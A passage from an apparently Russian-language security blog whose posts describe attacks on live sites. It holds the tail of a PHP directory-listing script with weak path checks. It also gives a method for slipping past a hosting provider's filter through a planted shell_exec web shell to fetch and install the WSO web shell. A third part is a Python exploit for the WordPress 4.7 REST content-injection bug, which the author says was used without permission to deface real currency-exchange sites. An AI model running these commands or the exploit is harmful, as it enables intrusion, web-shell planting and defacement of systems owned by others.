</span><span class='line'>      <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;dir&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;dir&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;/&#39;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  
</span><span class='line'>
</span><span class='line'>  <span class="nv">$dirok</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="nv">$dirnames</span> <span class="o">=</span> <span class="nb">split</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;dir&#39;</span><span class="p">]);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">for</span><span class="p">(</span><span class="nv">$di</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nv">$di</span><span class="o">&lt;</span><span class="nb">sizeof</span><span class="p">(</span><span class="nv">$dirnames</span><span class="p">);</span> <span class="nv">$di</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>
</span><span class='line'>      
</span><span class='line'>
</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="nv">$di</span><span class="o">&lt;</span><span class="p">(</span><span class="nb">sizeof</span><span class="p">(</span><span class="nv">$dirnames</span><span class="p">)</span><span class="o">-</span><span class="mi">2</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>
</span><span class='line'>          <span class="nv">$dotdotdir</span> <span class="o">=</span> <span class="nv">$dotdotdir</span> <span class="o">.</span> <span class="nv">$dirnames</span><span class="p">[</span><span class="nv">$di</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;/&#39;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>      
</span><span class='line'>
</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="nv">$dirnames</span><span class="p">[</span><span class="nv">$di</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;..&#39;</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>
</span><span class='line'>          <span class="nv">$dirok</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;dir&#39;</span><span class="p">],</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span><span class="o">==</span><span class="s1">&#39;/&#39;</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>
</span><span class='line'>      <span class="nv">$dirok</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="nv">$dirok</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>
</span><span class='line'>       <span class="nv">$leadon</span> <span class="o">=</span> <span class="nv">$leadon</span> <span class="o">.</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;dir&#39;</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="nv">$opendir</span> <span class="o">=</span> <span class="nv">$leadon</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$leadon</span><span class="p">)</span> <span class="nv">$opendir</span> <span class="o">=</span> <span class="s1">&#39;.&#39;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$opendir</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>
</span><span class='line'>  <span class="nv">$opendir</span> <span class="o">=</span> <span class="s1">&#39;.&#39;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="nv">$leadon</span> <span class="o">=</span> <span class="nv">$startdir</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="nb">clearstatcache</span><span class="p">();</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="nv">$handle</span> <span class="o">=</span> <span class="nb">opendir</span><span class="p">(</span><span class="nv">$opendir</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">while</span> <span class="p">(</span><span class="k">false</span> <span class="o">!==</span> <span class="p">(</span><span class="nv">$file</span> <span class="o">=</span> <span class="nb">readdir</span><span class="p">(</span><span class="nv">$handle</span><span class="p">)))</span> <span class="p">{</span>
</span><span class='line'>
</span><span class='line'>      <span class="c1">// first see if this file is required in the listing</span>
</span><span class='line'>
</span><span class='line'>      <span class="k">if</span> <span class="p">(</span><span class="nv">$file</span> <span class="o">==</span> <span class="s2">&quot;.&quot;</span> <span class="o">||</span> <span class="nv">$file</span> <span class="o">==</span> <span class="s2">&quot;..&quot;</span><span class="p">)</span>  <span class="k">continue</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>      <span class="nv">$discard</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>      <span class="k">for</span><span class="p">(</span><span class="nv">$hi</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$hi</span><span class="o">&lt;</span><span class="nb">sizeof</span><span class="p">(</span><span class="nv">$hide</span><span class="p">);</span><span class="nv">$hi</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>
</span><span class='line'>          <span class="k">if</span><span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span> <span class="nv">$hide</span><span class="p">[</span><span class="nv">$hi</span><span class="p">])</span><span class="o">!==</span><span class="k">false</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>
</span><span class='line'>              <span class="nv">$discard</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>          <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>      
</span><span class='line'>
</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="nv">$discard</span><span class="p">)</span> <span class="k">continue</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>      <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nb">filetype</span><span class="p">(</span><span class="nv">$leadon</span><span class="o">.</span><span class="nv">$file</span><span class="p">)</span> <span class="o">==</span> <span class="s2">&quot;dir&quot;</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>
</span><span class='line'>          <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$showdirs</span><span class="p">)</span> <span class="k">continue</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>      
</span><span class='line'>
</span><span class='line'>          <span class="nv">$n</span><span class="o">++</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>          <span class="k">if</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;sort&#39;</span><span class="p">]</span><span class="o">==</span><span class="s2">&quot;date&quot;</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>
</span><span class='line'>              <span class="nv">$key</span> <span class="o">=</span> <span class="o">@</span><span class="nb">filemtime</span><span class="p">(</span><span class="nv">$leadon</span><span class="o">.</span><span class="nv">$file</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;.</span><span class="si">$n</span><span class="s2">&quot;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>          <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>          <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>
</span><span class='line'>              <span class="nv">$key</span> <span class="o">=</span> <span class="nv">$n</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>          <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>          <span class="nv">$dirs</span><span class="p">[</span><span class="nv">$key</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$file</span> <span class="o">.</span> <span class="s2">&quot;/&quot;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>      <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>
</span><span class='line'>          <span class="nv">$n</span><span class="o">++</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>          <span class="k">if</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;sort&#39;</span><span class="p">]</span><span class="o">==</span><span class="s2">&quot;date&quot;</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>
</span><span class='line'>              <span class="nv">$key</span> <span class="o">=</span> <span class="o">@</span><span class="nb">filemtime</span><span class="p">(</span><span class="nv">$leadon</span><span class="o">.</span><span class="nv">$file</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;.</span><span class="si">$n</span><span class="s2">&quot;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>          <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>          <span class="k">elseif</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;sort&#39;</span><span class="p">]</span><span class="o">==</span><span class="s2">&quot;size&quot;</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>
</span><span class='line'>              <span class="nv">$key</span> <span class="o">=</span> <span class="o">@</span><span class="nb">filesize</span><span class="p">(</span><span class="nv">$leadon</span><span class="o">.</span><span class="nv">$file</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;.</span><span class="si">$n</span><span class="s2">&quot;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>          <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>          <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>
</span><span class='line'>              <span class="nv">$key</span> <span class="o">=</span> <span class="nv">$n</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>          <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>          <span class="nv">$files</span><span class="p">[</span><span class="nv">$key</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$file</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>          
</span><span class='line'>
</span><span class='line'>          <span class="k">if</span><span class="p">(</span><span class="nv">$displayindex</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>
</span><span class='line'>              <span class="k">if</span><span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nb">strtolower</span><span class="p">(</span><span class="nv">$file</span><span class="p">),</span> <span class="nv">$indexfiles</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>
</span><span class='line'>                  <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Location: </span><span class="si">$file</span><span class="s2">&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>                  <span class="k">die</span><span class="p">();</span>
</span><span class='line'>
</span><span class='line'>              <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>          <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="nb">closedir</span><span class="p">(</span><span class="nv">$handle</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="c1">// sort our files</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;sort&#39;</span><span class="p">]</span><span class="o">==</span><span class="s2">&quot;date&quot;</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>
</span><span class='line'>  <span class="o">@</span><span class="nb">ksort</span><span class="p">(</span><span class="nv">$dirs</span><span class="p">,</span> <span class="nx">SORT_NUMERIC</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="o">@</span><span class="nb">ksort</span><span class="p">(</span><span class="nv">$files</span><span class="p">,</span> <span class="nx">SORT_NUMERIC</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">elseif</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;sort&#39;</span><span class="p">]</span><span class="o">==</span><span class="s2">&quot;size&quot;</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>
</span><span class='line'>  <span class="o">@</span><span class="nb">natcasesort</span><span class="p">(</span><span class="nv">$dirs</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="o">@</span><span class="nb">ksort</span><span class="p">(</span><span class="nv">$files</span><span class="p">,</span> <span class="nx">SORT_NUMERIC</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">else</span> <span class="p">{</span>
</span><span class='line'>
</span><span class='line'>  <span class="o">@</span><span class="nb">natcasesort</span><span class="p">(</span><span class="nv">$dirs</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="o">@</span><span class="nb">natcasesort</span><span class="p">(</span><span class="nv">$files</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="c1">// order correctly</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;order&#39;</span><span class="p">]</span><span class="o">==</span><span class="s2">&quot;desc&quot;</span> <span class="o">&amp;&amp;</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;sort&#39;</span><span class="p">]</span><span class="o">!=</span><span class="s2">&quot;size&quot;</span><span class="p">)</span> <span class="p">{</span><span class="nv">$dirs</span> <span class="o">=</span> <span class="o">@</span><span class="nb">array_reverse</span><span class="p">(</span><span class="nv">$dirs</span><span class="p">);}</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;order&#39;</span><span class="p">]</span><span class="o">==</span><span class="s2">&quot;desc&quot;</span><span class="p">)</span> <span class="p">{</span><span class="nv">$files</span> <span class="o">=</span> <span class="o">@</span><span class="nb">array_reverse</span><span class="p">(</span><span class="nv">$files</span><span class="p">);}</span>
</span><span class='line'>
</span><span class='line'><span class="nv">$dirs</span> <span class="o">=</span> <span class="o">@</span><span class="nb">array_values</span><span class="p">(</span><span class="nv">$dirs</span><span class="p">);</span> <span class="nv">$files</span> <span class="o">=</span> <span class="o">@</span><span class="nb">array_values</span><span class="p">(</span><span class="nv">$files</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>Для изучения как не стоит делать, как раз подойдет)</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2017/06/26/obkhod-424-failed-dependency-na-khostinghakh-ukraine-dot-com-dot-ua/">Обход '424 Failed Dependency' на хостингах ukraine.com.ua</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2017-06-26T16:23:58+00:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>26</span><span class='date-suffix'>th</span>, <span class='date-year'>2017</span></span> <span class='time'>4:23 pm</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>Или почему специалисты ukraine.com.ua - идиоты.</p>

<p>Сегодня столкнулся с проблемой при попытке взаимодействовать через мини-шелл с файлами на
сервере, все это на хостинге <strong>ukraine.com.ua</strong>, а именно:</p>

<ul>
<li>Нельзя использовать <strong>cat</strong> для просмотра содержимого файлов</li>
<li>Использовать <strong>rm</strong>, <strong>echo</strong> и подобное</li>
<li>Команды в адресной строке типа site.ru/shell.php?cmd=echo &lsquo;нужный код&rsquo; > file.php,
например для загрузки того же <strong>wso</strong>, не проканает и выдаст <strong>424</strong> ошибку безопасности.</li>
</ul>


<h2>Проблема</h2>

<p> Например у меня есть зараженный файл со строкой:
 <code>php
echo shell_exec($_GET['cmd']);
</code>
 что позволяет казалось бы, спокойно работать с сервером напрямую, но &ldquo;гениальность&rdquo;
админов ukraine.com.ua работает на злоумышлинника ;)</p>

<p>Чем просмотреть файл? В <strong>*nix</strong> подобных системах, есть еще
<a href="https://en.wikipedia.org/wiki/Less_%28Unix%29">less</a>, который вполне (и даже в чем то
лучше) заменит <strong>cat</strong>.</p>

<p>Чем заменить <strong>echo</strong>, а вот тут есть <strong>printf</strong>, который работает аналогично в нашем
случае:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nb">printf</span> <span class="s1">&#39;some code&#39;</span> &gt; file.php
</span></code></pre></td></tr></table></div></figure>


<p>Как залить к примеру,
<a href="https://raw.githubusercontent.com/tennc/webshell/master/php/wso/wso-4.2.5.php">wso</a>?
Казалось бы, ничего сложного:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>http://site.ru/shell.php?cmd<span class="o">=</span><span class="nb">printf</span> <span class="s2">&quot;&lt;?php file_put_contents(&#39;wso.php&#39;, </span>
</span><span class='line'><span class="s2">file_get_contents(&#39;https://raw.githubusercontent.com/tennc/webshell/master/php/wso/wso-4.2.5.php&#39;)); </span>
</span><span class='line'><span class="s2">?&gt;&quot;</span> &gt; ../../site.ru/uploader_shell.php
</span></code></pre></td></tr></table></div></figure>


<p>То есть записываем в файл <strong>uploader_shell.php</strong> php код который скачает и сохранит файл
шелла. Но при таком подходе нас пошлют в <strong>424</strong>ю ошибку, во первых, хотя бы потому, что в
строке есть <strong>.php</strong>, и <strong>php4</strong>, <strong>php5</strong> не прокатят, а так же есть <strong>&lt;?php</strong>, что дает
понять, что кто то замыслил что то плохое ;)</p>

<h2>Решение</h2>

<p>Тут далеко ходить не нужно:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>http://site.ru/shell.php?cmd<span class="o">=</span><span class="nb">printf</span> <span class="s2">&quot;&lt;?file_put_contents(&#39;wso.phtml&#39;, </span>
</span><span class='line'><span class="s2">file_get_contents(&#39;https://raw.githubusercontent.com/tennc/webshell/master/php/wso/wso-4.2.5.php&#39;));?&gt;&quot;</span>
</span><span class='line'>&gt; ../../site.ru/uploader_shell.php
</span></code></pre></td></tr></table></div></figure>


<p>Таким образом мы все же создали загрузчик шелла <strong>uploader_shell.php</strong>, теперь просто стоит
его вызвать из адресной строки и он сохранит шелл рядом <strong>wso.php</strong>.</p>

<h2>Вывод</h2>

<p>Тех. специалисты ukraine.com.ua еще те идиоты. Лучше бы и не выебывались.</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2017/06/26/obienniki/">Обенники, котовые вы любите</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2017-06-26T08:53:02+00:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>26</span><span class='date-suffix'>th</span>, <span class='date-year'>2017</span></span> <span class='time'>8:53 am</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>Почти каждый, кто хоть раз менял валюту онлайн, обращался к &ldquo;авторитетным&rdquo; и &ldquo;проверенным&rdquo;
мониторинговым сервисам, как например этот - <strong>bestchange.ru</strong>
Да, безусловно обменники там практически все проверенные и не вызывают подозрения. Но,
например не каждый смотрит на безопасность веб-приложения когда совершает обмен.</p>

<h2>Wordpress и premiumbox</h2>

<p>Существует ряд плагинов для этой недоcms, которые позволяют расширить функционал недоблога
до недообменного сервиса, например - <a href="https://pluginu.com/premiumbox/">https://pluginu.com/premiumbox/</a></p>

<p>В сети уже продавались эксплоиты для него, если не ошибаюсь за 10btc и уже успешно проданы.</p>

<p>Сам же wordpress это сплошная дыра, с новой версии которой возникают еще более серьезные
уязвимости, причем очень смешные, такие как например &ldquo;content injection&rdquo; -
<a href="https://pluginu.com/premiumbox/">https://pluginu.com/premiumbox/</a></p>

<p>Уязвимые версии <strong>4.7</strong> - <strong>4.7.1</strong>, написав небольшой скрипт, я удостоверился что около
<strong>70%</strong> (70 - Карл!) обменников на bestchange, именно на wordpress, тогда я решил проверить
уязвимость на них, написал еще один скрипт, которые внедряет в пост нужный мне контент:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">requests</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">sys</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">validators</span>
</span><span class='line'>
</span><span class='line'><span class="k">class</span> <span class="nc">WP</span><span class="p">():</span>
</span><span class='line'>  <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">uri</span><span class="o">=</span><span class="bp">None</span><span class="p">):</span>
</span><span class='line'>      <span class="bp">self</span><span class="o">.</span><span class="n">verion</span> <span class="o">=</span> <span class="bp">None</span>
</span><span class='line'>      <span class="bp">self</span><span class="o">.</span><span class="n">vuln_path</span> <span class="o">=</span> <span class="s">&#39;/wp-json/wp/v2/posts/&#39;</span>
</span><span class='line'>      <span class="bp">self</span><span class="o">.</span><span class="n">detect_version</span><span class="p">(</span><span class="n">uri</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">def</span> <span class="nf">detect_version</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">uri</span><span class="o">=</span><span class="bp">None</span><span class="p">):</span>
</span><span class='line'>      <span class="k">if</span> <span class="ow">not</span> <span class="n">validators</span><span class="o">.</span><span class="n">url</span><span class="p">(</span><span class="n">uri</span><span class="p">):</span>
</span><span class='line'>          <span class="k">print</span><span class="p">(</span><span class="s">&#39;incorect uri&#39;</span><span class="p">)</span>
</span><span class='line'>          <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span><span class='line'>      <span class="c"># get posts from api wp</span>
</span><span class='line'>      <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s">&#39;user-agent&#39;</span><span class="p">:</span> <span class="s">&#39;security-idiots/0.0.1&#39;</span><span class="p">,</span> <span class="s">&#39;content-type&#39;</span><span class="p">:</span>
</span><span class='line'><span class="s">&#39;application/json; charset=utf8&#39;</span><span class="p">}</span>
</span><span class='line'>      <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">uri</span> <span class="o">+</span> <span class="bp">self</span><span class="o">.</span><span class="n">vuln_path</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
</span><span class='line'>      <span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
</span><span class='line'>          <span class="k">for</span> <span class="n">post</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">json</span><span class="p">():</span>
</span><span class='line'>              <span class="k">print</span><span class="p">(</span><span class="n">post</span><span class="p">[</span><span class="s">&#39;id&#39;</span><span class="p">]</span> <span class="o">+</span> <span class="s">&#39;|&#39;</span> <span class="o">+</span> <span class="n">uri</span><span class="p">)</span>
</span><span class='line'>              <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span><span class="s">&#39;title&#39;</span><span class="p">:</span> <span class="s">&#39;security idiots&#39;</span><span class="p">,</span> <span class="s">&#39;content&#39;</span><span class="p">:</span> <span class="s">&#39;security </span>
</span><span class='line'><span class="n">idiots</span><span class="s">&#39;}</span>
</span><span class='line'>              <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">uri</span> <span class="o">+</span> <span class="bp">self</span><span class="o">.</span><span class="n">vuln_path</span> <span class="o">+</span> <span class="s">&#39;</span><span class="si">%s</span><span class="s">&#39;</span> \
</span><span class='line'>                  <span class="o">%</span> <span class="n">post</span><span class="p">[</span><span class="s">&#39;id&#39;</span><span class="p">]</span> <span class="o">+</span> <span class="s">&#39;?id=</span><span class="si">%s</span><span class="s">&#39;</span> <span class="o">%</span> <span class="n">post</span><span class="p">[</span><span class="s">&#39;id&#39;</span><span class="p">]</span> <span class="o">+</span> <span class="s">&#39;abc&#39;</span><span class="p">,</span>
</span><span class='line'><span class="n">params</span><span class="o">=</span><span class="n">payload</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>      <span class="k">else</span><span class="p">:</span>
</span><span class='line'>          <span class="k">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">status_code</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Было обнаружено ряд обменников с данной уязвиомстью, один из которых <strong>bitmonsters.net</strong>, и
так, у меня это вышло: <a href="https://bitmonsters.net/wp-json/wp/v2/posts/1667">https://bitmonsters.net/wp-json/wp/v2/posts/1667</a>
<img src="http://imgur.com/to7klkZl.png" alt="enter image description here" /></p>

<p><img src="http://imgur.com/UbqWFdZl.png" alt="enter image description here" /></p>

<p>Сразу скажу, эфир у них лучше точно не выводить ;)</p>

<h2>А тут еще и Path Disclosure</h2>

<p>Вот таким образом еще можно в почти каждой версии wordpress узнать пути:
<a href="https://bitmonsters.net/wp-includes/rss-functions.php">https://bitmonsters.net/wp-includes/rss-functions.php</a>
<img src="http://imgur.com/ihZ524el.png" alt="enter image description here" /></p>

<h2>Итог</h2>

<p>Меняйте бабло только на более проверенных сервисах, которые ни в коем случае не построенны
на wordpress&hellip;</p>
</div>
  
  


    </article>
  
  <div class="pagination">
    
    <a href="/blog/archives">Blog Archives</a>
    
  </div>
</div>
<aside class="sidebar">
  
    <section>
  <h1>Recent Posts</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/blog/2017/07/02/galaktika-baghov/">Галактика багов</a>
      </li>
    
      <li class="post">
        <a href="/blog/2017/07/01/iskhodnyi-kod-default-dot-php-v-hostinger-podobnykh-khostinghakh/">Исходный код default.php в Hostinger-подобных хостингах</a>
      </li>
    
      <li class="post">
        <a href="/blog/2017/06/26/obkhod-424-failed-dependency-na-khostinghakh-ukraine-dot-com-dot-ua/">Обход '424 Failed Dependency' на хостингах ukraine.com.ua</a>
      </li>
    
      <li class="post">
        <a href="/blog/2017/06/26/obienniki/">Обенники, котовые вы любите</a>
      </li>
    
  </ul>
</section>

<section>
  <h1>GitHub Repos</h1>
  <ul id="gh_repos">
    <li class="loading">Status updating...</li>
  </ul>
  
  <a href="https://github.com/foozzi">@foozzi</a> on GitHub
  
  <script type="text/javascript">
    $(document).ready(function(){
        if (!window.jXHR){
            var jxhr = document.createElement('script');
            jxhr.type = 'text/javascript';
            jxhr.src = '/javascripts/libs/jXHR.js';
            var s = document.getElementsByTagName('script')[0];
            s.parentNode.insertBefore(jxhr, s);
        }

        github.showRepos({
            user: 'foozzi',
            count: 5,
            skip_forks: true,
            target: '#gh_repos'
        });
    });
  </script>
  <script src="/javascripts/github.js" type="text/javascript"> </script>
</section>





  
</aside>

    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2017 - foozzi -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  







  <script type="text/javascript">
    (function(){
      var twitterWidgets = document.createElement('script');
      twitterWidgets.type = 'text/javascript';
      twitterWidgets.async = true;
      twitterWidgets.src = '//platform.twitter.com/widgets.js';
      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
    })();
  </script>





</body>
</html>
